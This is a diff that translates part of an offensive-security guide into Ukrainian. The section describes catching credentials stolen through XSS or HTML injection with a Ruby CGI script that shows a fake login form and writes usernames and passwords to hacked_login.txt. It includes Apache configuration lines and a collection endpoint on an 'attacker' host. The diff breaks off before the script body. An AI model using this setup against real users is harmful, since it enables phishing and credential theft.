@@ -231,18 +231,19 @@ end
 
 
 ## CGI
-### Отримання інформації - з XSS/HTMLi експлуатації
+### Отримання інформації - використовуючи XSS/HTMLi експлуатацію
 
-When you exploit XSS or HTML injection you may need to receive the grepped data from exploited user to your external server. Here a simple example of CGI script take sent get request from fake login from that asks users to enter log-in with username and password then will store the data to `hacked_login.txt` text file and fix its permissions to assure that nobody can access that file from public.
+При використанні XSS чи HTML ін'єкції, вам може знадобитися можливість відправки відфільтрованих даних від заламаного користувач на ваш сервер. Ось приклад простого CGI скрипта, що показує фальшиву форму входу яка просить користувача зайти в систему використовуючи логін та пароль, й потім зберігає введені данні в файл `hacked_login.txt` та міняє права доступу на нього, аби бти впевненими, що більш ніхто не має досутпу до нього.
 
-Add the following to `/etc/apache2/sites-enabled/[SITE]` then restart the service
+Додайте наступний код до `/etc/apache2/sites-enabled/[SITE]` та перезавантажте сервіс.
 ```
 <Directory /var/www/[CGI FOLDER]>
         AddHandler cgi-script .rb
         Options +ExecCGI
 </Directory>
 ```
-Now, put the script in /var/www/[CGI FOLDER]. You can use it now.
+Далі, покладіть скрипт в папку /var/www/[CGI FOLDER]. І тепер ви можете користатися ним:
+
 ```ruby
 #!/usr/bin/ruby
 # CGI script gets user/pass | http://attacker/info.rb?user=USER&pass=PASS
